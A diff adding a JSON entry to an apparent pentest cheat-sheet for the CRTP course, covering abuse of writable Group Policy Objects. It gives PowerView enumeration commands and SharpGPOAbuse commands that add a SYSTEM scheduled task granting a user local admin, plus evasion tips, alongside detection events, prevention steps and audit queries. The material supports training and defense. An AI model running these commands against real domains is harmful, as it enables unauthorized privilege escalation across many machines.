@@ -1,0 +1,87 @@
+{
+  "id": "crtp-gpo-abuse",
+  "name": "GPO Misconfiguration Abuse (SharpGPOAbuse)",
+  "command": "Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'CreateChild|WriteProperty|GenericAll'}",
+  "description": "Identify and abuse write access to Group Policy Objects to execute arbitrary code on all computers in the affected OU.",
+  "platform": "windows",
+  "category": "Active Directory",
+  "subcategory": "Local PrivEsc",
+  "type": "command",
+  "certifications": [
+    "CRTP"
+  ],
+  "source": "CRTP",
+  "opsec": "moderate",
+  "mitre": [
+    "T1484.001"
+  ],
+  "tools": [
+    "PowerView",
+    "SharpGPOAbuse"
+  ],
+  "tags": [
+    "gpo",
+    "group-policy",
+    "privesc",
+    "persistence",
+    "sharpgpoabuse"
+  ],
+  "steps": [
+    {
+      "label": "Find writable GPOs",
+      "command": "Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'CreateChild|WriteProperty|GenericAll'} | select ObjectDN,IdentityReference"
+    },
+    {
+      "label": "Add scheduled task via GPO",
+      "command": ".\\SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author 'NT AUTHORITY\\SYSTEM' --Command 'cmd.exe' --Arguments '/c net localgroup administrators <user> /add' --GPOName '<gpo_name>'"
+    },
+    {
+      "label": "Force GPO update on target",
+      "command": "gpupdate /force"
+    }
+  ],
+  "examples": [
+    {
+      "label": "Find GPOs where we have write access",
+      "command": "Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -match 'jdoe'} | select ObjectDN,ActiveDirectoryRights"
+    },
+    {
+      "label": "Add machine scheduled task",
+      "command": ".\\SharpGPOAbuse.exe --AddComputerTask --TaskName 'Updater' --Author 'NT AUTHORITY\\SYSTEM' --Command 'cmd.exe' --Arguments '/c net localgroup administrators jdoe /add' --GPOName 'Default Domain Policy'"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "crtp-credential-dumping",
+      "note": "Dump creds once local admin via GPO",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-acl-persistence",
+      "note": "ACL persistence for more targeted abuse",
+      "rel": "alternative"
+    }
+  ],
+  "notes": "GPO write access = code execution on every computer the GPO applies to. Very powerful. Requires gpupdate cycle for task to execute.",
+  "references": [
+    {
+      "title": "CRTP - GPO Abuse",
+      "url": "https://www.alteredsecurity.com/adlab"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Group Policy Objects control system configuration across the domain. If a non-admin account has write permissions on a GPO (CreateChild, WriteProperty, or GenericWrite via BloodHound ACL analysis), SharpGPOAbuse can modify that GPO to add a local admin, schedule a task, or set a registry run key \u2014 affecting all computers and users in the linked OU. Changes take effect at the next Group Policy refresh (90 min default, or gpupdate /force).",
+    "prerequisites": "Write permissions on a GPO (identified via BloodHound: 'Find GPOs where Domain Users have Modify Rights'). SharpGPOAbuse or PowerGPOAbuse. Domain user account. The GPO must be linked to an OU containing target computers/users.",
+    "impact": "T1484.001 Domain Policy Modification: Group Policy Modification. Code execution on all computers in the linked OU. Local admin rights on targeted systems. Persistent via GPO \u2014 survives reboots. Can add a scheduled task that runs on all workstations in the domain if linked at domain level.",
+    "detection": "Event 5136 on the GPO object: DACL or GPO content modified. Event 5145: GPO file accessed from SYSVOL share. SIEM: GPO content changes from non-admin source. Windows Event 4728 (group member added) if GPO adds local admin. Sysmon Event 11: file write to SYSVOL\\{GUID}\\Machine\\Microsoft\\Windows NT\\SecEdit\\. MDI: GPO modification alert.\nAdversary modifies GPOs, domain trust, or directory service objects via GUI, CLI, or programmatic APIs: creation/modification of GPOs, delegation permissions, trust objects, or rogue DC registration (DET0270/AN0755). Adversary modifies tenant policy through changes to federation configuration, trust settings, or identity provider additions in Microsoft 365/Azure AD via Portal, PowerShell, or Graph API; includes setting authentication to federated or updating federated domains (AN0756).",
+    "artifacts": "Event 5136: GPO object modified | SYSVOL file change: GptTmpl.inf or {GUID}.xml written by non-admin | Event 4728: unexpected local admin group addition on target hosts | Sysmon: SYSVOL write from workstation | MDI: GPO modification alert",
+    "prevention": "Audit GPO DACLs with BloodHound: 'Find GPOs where Domain Users have Modify Rights'. Remove non-admin write permissions on GPOs. Enable GPMC logging. Monitor Event 5136 on GPO objects. Require change control for GPO modifications (only via dedicated GPO management workstation). MDI deployment.\nAudit: Identify and correct GPO permissions abuse opportunities using auditing tools such as BloodHound.\nPrivileged Account Management: Use least privilege; protect administrative access to Domain Controllers and AD FS servers; do not create service accounts with administrative privileges.\nUser Account Management: Implement WMI and security filtering to tailor which users and computers a GPO applies to.",
+    "evasion": "Modify GPO to add a scheduled task that runs at startup/login (blends with legitimate GPO startup scripts). Use an existing GPO that's already applied rather than creating a new one. GPO changes have 90-min delay \u2014 makes correlation harder.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1484/001/"
+    ],
+    "misconfiguration": "Non-admin groups have write permissions on GPOs (often from legacy delegation or mis-scoped admin roles). No Event 5136 monitoring on GPO objects. GPO DACLs not regularly audited.",
+    "vulnerable_config": "# Find GPOs with non-admin write permissions:\nGet-NetGPO | ForEach-Object {\n  $gpo = $_\n  Get-ObjectAcl $gpo.AdsPath -ResolveGUIDs | Where-Object {\n    $_.ActiveDirectoryRights -match 'Write|Create|GenericAll' -and\n    $_.IdentityReference -notmatch 'Domain Admins|CREATOR OWNER|SYSTEM|Enterprise Admins'\n  } | Select-Object @{N='GPO';E={$gpo.DisplayName}},IdentityReference,ActiveDirectoryRights\n}\n# Output: 'IT_Computers_GPO' \u2014 CORP\\HelpDesk \u2014 WriteProperty \u2192 VULNERABLE",
+    "secure_config": "# Remove non-admin write ACEs from GPOs:\n# GPMC \u2192 right-click GPO \u2192 Edit Delegations \u2192 remove non-admin edit rights\n\n# Audit GPO DACLs with BloodHound:\n# Cypher: MATCH (g:GPO) WHERE g.owned=true RETURN g.name\n# Or: 'Find GPOs where Domain Users have Modify Rights' built-in query\n\n# Enable Event 5136 on GPO objects:\n# Advanced Audit: DS Access \u2192 Audit Directory Service Changes\n# SIEM: EventID=5136 AND ObjectDN contains 'CN=Policies,CN=System' \u2192 ALERT\n\n# Change control: require ITSM ticket for GPO modifications\n# Only GPO admins (dedicated group) have write rights \u2014 review quarterly"
+  }
+}
